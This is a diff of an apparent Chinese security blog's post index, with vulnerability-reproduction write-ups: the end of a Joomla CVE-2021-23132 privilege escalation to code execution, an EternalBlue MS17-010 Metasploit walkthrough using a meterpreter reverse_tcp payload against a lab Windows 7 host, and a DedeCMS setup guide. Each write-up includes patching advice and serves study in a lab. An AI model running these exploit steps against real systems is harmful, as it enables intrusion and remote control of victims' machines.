+      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
+    &lt;&#x2F;field&gt;
+
+    &lt;field
+      name&#x3D;&quot;history_limit&quot;
+      type&#x3D;&quot;number&quot;
+      label&#x3D;&quot;JGLOBAL_HISTORY_LIMIT_OPTIONS_LABEL&quot;
+      description&#x3D;&quot;JGLOBAL_HISTORY_LIMIT_OPTIONS_DESC&quot;
+      filter&#x3D;&quot;integer&quot;
+      default&#x3D;&quot;5&quot;
+      showon&#x3D;&quot;save_history:1&quot;
+    &#x2F;&gt;
+
+  &lt;&#x2F;fieldset&gt;
+
+   &lt;fieldset
+    name&#x3D;&quot;massmail&quot;
+    label&#x3D;&quot;COM_USERS_MASS_MAIL&quot;
+    description&#x3D;&quot;COM_USERS_MASS_MAIL_DESC&quot;&gt;
+
+    &lt;field
+       name&#x3D;&quot;mailSubjectPrefix&quot;
+       type&#x3D;&quot;text&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_SUBJECT_PREFIX_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_SUBJECT_PREFIX_DESC&quot;
+    &#x2F;&gt;
+
+     &lt;field
+       name&#x3D;&quot;mailBodySuffix&quot;
+      type&#x3D;&quot;textarea&quot;
+      label&#x3D;&quot;COM_USERS_CONFIG_FIELD_MAILBODY_SUFFIX_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_CONFIG_FIELD_MAILBODY_SUFFIX_DESC&quot;
+       rows&#x3D;&quot;5&quot;
+       cols&#x3D;&quot;30&quot;
+    &#x2F;&gt;
+
+  &lt;&#x2F;fieldset&gt;
+
+  &lt;fieldset
+    name&#x3D;&quot;debug&quot;
+    label&#x3D;&quot;COM_USERS_DEBUG_LABEL&quot;
+    description&#x3D;&quot;COM_USERS_DEBUG_DESC&quot;&gt;
+
+    &lt;field
+      name&#x3D;&quot;debugUsers&quot;
+      type&#x3D;&quot;radio&quot;
+      label&#x3D;&quot;COM_USERS_DEBUG_USERS_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_DEBUG_USERS_DESC&quot;
+      class&#x3D;&quot;btn-group btn-group-yesno&quot;
+      default&#x3D;&quot;1&quot;
+      &gt;
+      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
+      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
+    &lt;&#x2F;field&gt;
+
+    &lt;field
+      name&#x3D;&quot;debugGroups&quot;
+      type&#x3D;&quot;radio&quot;
+      label&#x3D;&quot;COM_USERS_DEBUG_GROUPS_LABEL&quot;
+      description&#x3D;&quot;COM_USERS_DEBUG_GROUPS_DESC&quot;
+      class&#x3D;&quot;btn-group btn-group-yesno&quot;
+      default&#x3D;&quot;1&quot;
+      &gt;
+      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
+      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
+    &lt;&#x2F;field&gt;
+
+  &lt;&#x2F;fieldset&gt;
+
+  &lt;fieldset name&#x3D;&quot;integration&quot;
+    label&#x3D;&quot;JGLOBAL_INTEGRATION_LABEL&quot;
+    description&#x3D;&quot;COM_USERS_CONFIG_INTEGRATION_SETTINGS_DESC&quot;
+  &gt;
+
+    &lt;field
+      name&#x3D;&quot;integration_sef&quot;
+      type&#x3D;&quot;note&quot;
+      label&#x3D;&quot;JGLOBAL_SEF_TITLE&quot;
+    &#x2F;&gt;
+
+    &lt;field
+      name&#x3D;&quot;sef_advanced&quot;
+      type&#x3D;&quot;radio&quot;
+      class&#x3D;&quot;btn-group btn-group-yesno btn-group-reversed&quot;
+      default&#x3D;&quot;0&quot;
+      label&#x3D;&quot;JGLOBAL_SEF_ADVANCED_LABEL&quot;
+      description&#x3D;&quot;JGLOBAL_SEF_ADVANCED_DESC&quot;
+      filter&#x3D;&quot;integer&quot;
+      &gt;
+      &lt;option value&#x3D;&quot;0&quot;&gt;JGLOBAL_SEF_ADVANCED_LEGACY&lt;&#x2F;option&gt;
+      &lt;option value&#x3D;&quot;1&quot;&gt;JGLOBAL_SEF_ADVANCED_MODERN&lt;&#x2F;option&gt;
+    &lt;&#x2F;field&gt;
+
+    &lt;field
+      name&#x3D;&quot;integration_customfields&quot;
+      type&#x3D;&quot;note&quot;
+      label&#x3D;&quot;JGLOBAL_FIELDS_TITLE&quot;
+    &#x2F;&gt;
+
+    &lt;field
+      name&#x3D;&quot;custom_fields_enable&quot;
+      type&#x3D;&quot;radio&quot;
+      label&#x3D;&quot;JGLOBAL_CUSTOM_FIELDS_ENABLE_LABEL&quot;
+      description&#x3D;&quot;JGLOBAL_CUSTOM_FIELDS_ENABLE_DESC&quot;
+      class&#x3D;&quot;btn-group btn-group-yesno&quot;
+      default&#x3D;&quot;1&quot;
+      &gt;
+      &lt;option value&#x3D;&quot;1&quot;&gt;JYES&lt;&#x2F;option&gt;
+      &lt;option value&#x3D;&quot;0&quot;&gt;JNO&lt;&#x2F;option&gt;
+    &lt;&#x2F;field&gt;
+
+  &lt;&#x2F;fieldset&gt;
+
+  &lt;fieldset
+    name&#x3D;&quot;permissions&quot;
+    label&#x3D;&quot;JCONFIG_PERMISSIONS_LABEL&quot;
+    description&#x3D;&quot;JCONFIG_PERMISSIONS_DESC&quot;
+    &gt;
+
+    &lt;field
+      name&#x3D;&quot;rules&quot;
+      type&#x3D;&quot;rules&quot;
+      label&#x3D;&quot;JCONFIG_PERMISSIONS_LABEL&quot;
+      filter&#x3D;&quot;rules&quot;
+      validate&#x3D;&quot;rules&quot;
+      component&#x3D;&quot;com_users&quot;
+      section&#x3D;&quot;component&quot;
+    &#x2F;&gt;
+
+  &lt;&#x2F;fieldset&gt;
+&lt;&#x2F;config&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"><br>这一步我自己复现的时候没有实现，再上传的时候提醒“不支持的文件类型”，之后发现在默认设置里加上.xml类型，还是会提醒“无效的MIME类型”，不知道是不是我搞的版本问题(●—●),上传不成功我还尝试直接从本地改文件，还是不行，我怀疑是不是网络流传的xml文件是错的。<br>唉不说了，复现都不成功，真的菜，按照其他大佬的文章，添加好xml文件以后，在普通管理员身份下，即可创建超级管理员用户了。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"><br>创建一个超级管理员，并登陆系统。登录系统后进入到模板管理。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br>然后在指定模板（默认beez3模板）下修改某个php文件内容。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt="图片"><br>例如这里修改error.php，并添加phpinfo的代码。然后访问：<a href="http://localhost/templates/beez3/error.php">http://localhost/templates/beez3/error.php</a> 可以看到成功执行了phpinfo，实现任意代码执行。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/16.png" alt="图片"></p>
+<p>后面我还试了一下网上的POC，果然也是目录遍历没问题，但加xml文件那里就出问题了<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/18.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/19.png" alt="图片"><br>不过用POC的xml文件直接就给我搞出来个超级管理员用户，哈哈哈这算不算复现成功了呢<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>当前最新版本为3.9.25，建议相关用户升级到3.9.25版本，已完全修复该漏洞。或者登陆系统后台，系统会提示升级，点击一下完成自动升级即可。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/17.png" alt="图片"></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://hackdig.com/03/hack-293705.htm">http://hackdig.com/03/hack-293705.htm</a><br><a href="https://www.venustech.com.cn/new_type/aqtg/20210310/22465.html">https://www.venustech.com.cn/new_type/aqtg/20210310/22465.html</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>永恒之蓝 MS17-010漏洞复现</title>
+    <url>/2021/01/22/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
+<h3 id="漏洞原理代码详解"><a href="#漏洞原理代码详解" class="headerlink" title="漏洞原理代码详解"></a>漏洞原理代码详解</h3><p><a href="http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772">http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772</a><br><a href="https://blog.csdn.net/qq_27446553/article/details/73480807">https://blog.csdn.net/qq_27446553/article/details/73480807</a></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>攻击机：kali-Linux-2019   192.168.141.133<br>靶机：Windows7 x64   192.168.141.136</p>
+<p>我们可以利用kali-msf框架里收录的永恒之蓝漏洞环境来复现这个漏洞<br>命令打开工具：</p>
+<pre class="line-numbers language-none"><code class="language-none">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>上面显示的是漏洞利用数和执行语句数量，接下来选择永恒之蓝的模块</p>
+<pre class="line-numbers language-none"><code class="language-none">search ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>有如上几种漏洞利用，我们就选择其中一种</p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"><br>然后查看一下有哪些利用语句（payload）</p>
+<pre class="line-numbers language-none"><code class="language-none">show payloads<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br>我们选择其中一种执行语句</p>
+<pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br>查看一下当前漏洞利用信息</p>
+<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br>现在使用的这个漏洞利用是有反弹shell的攻击，RHOSTS就是靶机的ip地址，LHOST是反弹的地址，也就是我们的攻击机ip，把信息对应填入</p>
+<pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.141.136
+set LHOST 192.168.141.133<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br>设置完成再检测一下当前漏洞利用信息</p>
+<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br>检测无误后执行漏洞</p>
+<pre class="line-numbers language-none"><code class="language-none">exploit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br>有以上显示即为攻击成功<br>输入shell，显示获取shell成功<br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"><br>拥有system最高权限<br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"><br>尝试截图<br>Screenshot<br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"><br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>①在线更新；开启Windows Update更新。<br>②打补丁；此漏洞对应的微软补丁地址：<a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2017.3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dedecms网站搭建</title>
+    <url>/2021/01/21/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<ol>
+<li>下载织梦开源程序</li>
+</ol>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/1.png" alt="图片"></p>
+<ol start="2">
+<li>解压织梦程序安装包，将uploads里面所有的程序文件，复制粘贴到phpstudy的WWW文件夹里面。</li>
+<li>访问127.0.0.1的DedeCMS网址</li>
+</ol>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/2.png" alt="图片"></p>
+<ol start="4">
+<li>点击继续</li>
+</ol>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/3.png" alt="图片"></p>
+<ol start="5">
+<li>点继续，进入参数配置页面，数据库主机：localhost，数据库用户：root，数据库密码：root，对于PHPstudy本地环境来说，这几项是固定的，在这里的数据库名称可以更改，也可以不更改。接着再自己设置一下用户名、密码、网站名称、管理员邮箱即可点击继续安装。</li>
+</ol>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/4.png" alt="图片"></p>
+<ol start="6">
+<li>安装完成，登录网站后台</li>
+</ol>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/5.png" alt="图片"></p>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/6.png" alt="图片"></p>
+<ol start="7">
+<li>登陆成功！</li>
+</ol>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/7.png" alt="图片"></p>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/8.png" alt="图片"></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>环境搭建</category>
+      </categories>
+  </entry>
+  <entry>
     <title>致远OA-ajax.do任意文件上传漏洞复现</title>
     <url>/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。</p>
@@ -133,79 +595,6 @@ managerMethod&#x3D;validate&amp;arguments&#x3D;%1F%C2%8B%08%00%00%00%00%00%00%00
       </categories>
       <tags>
         <tag>2021.1</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dedecms网站搭建</title>
-    <url>/2021/01/21/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<ol>
-<li>下载织梦开源程序</li>
-</ol>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/1.png" alt="图片"></p>
-<ol start="2">
-<li>解压织梦程序安装包，将uploads里面所有的程序文件，复制粘贴到phpstudy的WWW文件夹里面。</li>
-<li>访问127.0.0.1的DedeCMS网址</li>
-</ol>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/2.png" alt="图片"></p>
-<ol start="4">
-<li>点击继续</li>
-</ol>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/3.png" alt="图片"></p>
-<ol start="5">
-<li>点继续，进入参数配置页面，数据库主机：localhost，数据库用户：root，数据库密码：root，对于PHPstudy本地环境来说，这几项是固定的，在这里的数据库名称可以更改，也可以不更改。接着再自己设置一下用户名、密码、网站名称、管理员邮箱即可点击继续安装。</li>
-</ol>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/4.png" alt="图片"></p>
-<ol start="6">
-<li>安装完成，登录网站后台</li>
-</ol>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/5.png" alt="图片"></p>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/6.png" alt="图片"></p>
-<ol start="7">
-<li>登陆成功！</li>
-</ol>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/7.png" alt="图片"></p>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/8.png" alt="图片"></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>环境搭建</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>永恒之蓝 MS17-010漏洞复现</title>
-    <url>/2021/01/22/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
-<h3 id="漏洞原理代码详解"><a href="#漏洞原理代码详解" class="headerlink" title="漏洞原理代码详解"></a>漏洞原理代码详解</h3><p><a href="http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772">http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772</a><br><a href="https://blog.csdn.net/qq_27446553/article/details/73480807">https://blog.csdn.net/qq_27446553/article/details/73480807</a></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>攻击机：kali-Linux-2019   192.168.141.133<br>靶机：Windows7 x64   192.168.141.136</p>
-<p>我们可以利用kali-msf框架里收录的永恒之蓝漏洞环境来复现这个漏洞<br>命令打开工具：</p>
-<pre class="line-numbers language-none"><code class="language-none">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>上面显示的是漏洞利用数和执行语句数量，接下来选择永恒之蓝的模块</p>
-<pre class="line-numbers language-none"><code class="language-none">search ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>有如上几种漏洞利用，我们就选择其中一种</p>
-<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"><br>然后查看一下有哪些利用语句（payload）</p>
-<pre class="line-numbers language-none"><code class="language-none">show payloads<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br>我们选择其中一种执行语句</p>
-<pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br>查看一下当前漏洞利用信息</p>
-<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br>现在使用的这个漏洞利用是有反弹shell的攻击，RHOSTS就是靶机的ip地址，LHOST是反弹的地址，也就是我们的攻击机ip，把信息对应填入</p>
-<pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.141.136
-set LHOST 192.168.141.133<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br>设置完成再检测一下当前漏洞利用信息</p>
-<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9DMS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br>检测无误后执行漏洞</p>
-<pre class="line-numbers language-none"><code class="language-none">exploit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
